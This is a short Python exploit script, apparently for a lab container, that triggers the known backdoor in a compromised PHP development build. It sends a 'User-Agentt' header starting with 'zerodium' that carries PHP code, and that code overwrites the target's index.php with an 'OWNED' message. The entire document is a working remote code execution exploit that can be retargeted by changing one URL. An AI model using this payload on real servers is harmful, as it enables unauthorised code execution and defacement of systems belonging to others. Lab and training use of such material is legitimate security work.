#!/usr/bin/env python3
import requests

TARGET = "http://localhost:8080"   # change if your container is mapped differently

# Obvious visible change: rewrite index.php
payload = 'zerodiumfile_put_contents("index.php", "<?php echo \\"PATCHED / OWNED by lab payload\\n\\"; ?>");'

headers = {
    "User-Agent": "Mozilla/5.0 (lab-demo)",
    "User-Agentt": payload,          # the backdoor trigger
}

r = requests.get(TARGET, headers=headers, timeout=5)
print(f"Status: {r.status_code}")
print("Response preview:", r.text[:200] if r.text else "(empty)")
print("\nNow refresh the page in a browser or curl it — you should see the new content.")